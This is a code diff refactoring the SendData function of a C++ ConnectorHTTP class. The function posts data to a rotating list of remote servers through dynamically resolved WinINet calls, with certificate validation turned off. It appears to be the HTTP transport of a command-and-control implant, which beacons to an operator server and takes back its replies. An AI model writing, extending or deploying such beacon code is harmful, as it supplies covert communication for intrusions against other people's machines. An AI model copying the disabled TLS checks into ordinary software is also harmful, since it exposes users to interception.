@@ -122,131 +122,119 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 
 void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 {
-	this->recvSize = 0;
-	this->recvData = 0;
+    this->recvSize = 0;
+    this->recvData = 0;
 
-	ULONG attempt   = 0;
-	BOOL  connected = FALSE;
-	BOOL  result    = FALSE;
-	DWORD context   = 0;
+    const char* CLOSE_HDR = "Connection: close\r\n";
 
-	while ( !connected && attempt < this->server_count) {
-		DWORD dwError = 0;
+    ULONG attempt = 0;
+    while (attempt < this->server_count)
+    {
+        DWORD     dwError   = 0;
+        BOOL      connected = FALSE;
+        HINTERNET hRequest  = NULL;
+        HINTERNET hConnect  = NULL;
+        char*     sendHdr   = NULL;
+        DWORD     closeLen  = 19, hdrLen = 0, allLen = 0;
+        CHAR      acceptTypes[4] = { '*', '/', '*', 0 };
+        LPCSTR    types[2]       = { acceptTypes, 0 };
+        DWORD     flags          = 0;
 
-		if (!this->hInternet)
-			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );
-		if ( this->hInternet ) {
+        HINTERNET hInternet = this->functions->InternetOpenA(
+                this->user_agent,
+                INTERNET_OPEN_TYPE_DIRECT,
+                NULL,
+                NULL,
+                0);
+        if (!hInternet) return;
 
-			if ( !this->hConnect )
-				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
+        hConnect = this->functions->InternetConnectA(
+            hInternet,
+            this->server_address[this->server_index],
+            this->server_ports[this->server_index],
+            NULL, NULL,
+            INTERNET_SERVICE_HTTP,
+            0,
+            0);
+        if (!hConnect) goto ROTATE;
 
-			if ( this->hConnect )
-			{
-				CHAR acceptTypes[] = { '*', '/', '*', 0 };
-				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
-				DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
-				if (this->ssl)
-					flags |= INTERNET_FLAG_SECURE;
+        flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
+                INTERNET_FLAG_NO_UI  | INTERNET_FLAG_NO_COOKIES;
+        if (this->ssl) flags |= INTERNET_FLAG_SECURE;
 
-				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
-				if (hRequest) {
-					if (this->ssl) {
-						DWORD dwFlags;
-						DWORD dwBuffer = sizeof(DWORD);
-						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
-						if (result) {
-							dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
-							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
-						}
-					}
+        hRequest = this->functions->HttpOpenRequestA(
+            hConnect,
+            this->http_method,
+            this->uri,
+            NULL,
+            NULL,
+            types,
+            flags,
+            0);
+        if (!hRequest) goto ROTATE;
 
-					connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)data, (DWORD)data_size);
-					if (connected) {
-						char statusCode[255];
-						DWORD statusCodeLenght = 255;
-						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
+        {
+            BOOL disableReuse = TRUE;
+            this->functions->InternetSetOptionA(hRequest, 0x33, &disableReuse, sizeof(disableReuse));
+        }
 
-						if (result && _atoi(statusCode) == 200) {
-							DWORD answerSize = 0;
-							DWORD dwLengthDataSize = sizeof(DWORD);
-							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
+        hdrLen  = (DWORD)_strlen(this->headers);
+        allLen  = closeLen + hdrLen;
+        sendHdr = (char*)this->functions->LocalAlloc(LPTR, allLen + 1);
+        if (!sendHdr) goto ROTATE;
+        memcpy(sendHdr, CLOSE_HDR, closeLen);
+        memcpy(sendHdr + closeLen, this->headers, hdrLen);
+        sendHdr[allLen] = 0;
 
-							if (result) {
-								DWORD dwNumberOfBytesAvailable = 0;
-								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
+        if (this->ssl)
+        {
+            DWORD dwFlags, sz = sizeof(dwFlags);
+            if (this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &sz)) {
+                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
+                this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+            }
+        }
 
-								if (result && answerSize > 0) {
-									ULONG numberReadedBytes = 0;
-									DWORD readedBytes = 0;
-									BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);
+        connected = this->functions->HttpSendRequestA(hRequest, sendHdr, allLen, (LPVOID)data, (DWORD)data_size);
 
-									while (numberReadedBytes < answerSize) {
-										result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
-										if (!result || !readedBytes) {
-											break;
-										}
-										numberReadedBytes += readedBytes;
-									}
-									this->recvSize = numberReadedBytes;
-									this->recvData = buffer;
-								}
-							}
-							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
-								ULONG numberReadedBytes = 0;
-								DWORD readedBytes = 0;
-								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, 0);
-								DWORD dwNumberOfBytesAvailable = 0;
+        if (connected) {
+            char status[16] = {0}; DWORD stLen = sizeof(status);
+            if (this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, status, &stLen, 0) && _atoi(status)==200)
+            {
+                DWORD answerSize = 0, sz = sizeof(DWORD);
+                if (this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER, &answerSize, &sz, NULL) && answerSize) {
+                    DWORD avail=0, readed=0; ULONG total=0;
+                    BYTE* buf=(BYTE*)this->functions->LocalAlloc(LPTR,answerSize);
+                    while (total<answerSize && this->functions->InternetQueryDataAvailable(hRequest,&avail,0,0)&&avail) {
+                        if (!this->functions->InternetReadFile(hRequest,buf+total,avail,&readed)||!readed) break;
+                        total+=readed;
+                    }
+                    if (total){this->recvSize=total;this->recvData=buf;} else this->functions->LocalFree(buf);
+                } else if (this->functions->GetLastError()==ERROR_HTTP_HEADER_NOT_FOUND) {
+                    DWORD avail=0, readed=0; ULONG total=0;
+                    BYTE* buf=(BYTE*)this->functions->LocalAlloc(LPTR,0);
+                    while (this->functions->InternetQueryDataAvailable(hRequest,&avail,0,0)&&avail) {
+                        buf=(BYTE*)this->functions->LocalReAlloc(buf,total+avail,LMEM_MOVEABLE);
+                        if (!this->functions->InternetReadFile(hRequest,buf+total,avail,&readed)||!readed) break;
+                        total+=readed;
+                    }
+                    if(total){this->recvSize=total;this->recvData=buf;} else this->functions->LocalFree(buf);
+                }
+            }
+        }
 
-								while (1) {
-									result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
-									if (!result || !dwNumberOfBytesAvailable)
-										break;
+ROTATE:
+        if (sendHdr) this->functions->LocalFree(sendHdr);
+        if (hRequest) this->functions->InternetCloseHandle(hRequest);
+        if (hConnect) this->functions->InternetCloseHandle(hConnect);
+        this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0);
+        if (hInternet) this->functions->InternetCloseHandle(hInternet);
 
-									buffer = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
-									result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
-									if (!result || !readedBytes) {
-										break;
-									}
-									numberReadedBytes += readedBytes;
-								}
-
-								if (numberReadedBytes) {
-									this->recvSize = numberReadedBytes;
-									this->recvData = buffer;
-								}
-								else {
-									this->functions->LocalFree(buffer);
-								}
-							}
-						}
-					}
-					else {
-						dwError = this->functions->GetLastError();
-					}
-					this->functions->InternetCloseHandle(hRequest);
-				}
-			}
-
-			attempt++;
-			if (!connected) {
-				if ( dwError == ERROR_INTERNET_CANNOT_CONNECT || dwError == ERROR_INTERNET_TIMEOUT ) {
-					if (this->hConnect) {
-						this->functions->InternetCloseHandle(this->hConnect);
-						this->hConnect = NULL;
-					}
-					if (this->hInternet) {
-						this->functions->InternetCloseHandle(this->hInternet);
-						this->hInternet = NULL;
-					}
-
-					this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-					this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
-				}
-
-				this->server_index = (this->server_index + 1) % this->server_count;
-			}
-		}
-	}
+        if (connected) break;
+        attempt++;
+        this->server_index = (this->server_index + 1) % this->server_count;
+        Sleep(300);
+    }
 }
 
 BYTE* ConnectorHTTP::RecvData()
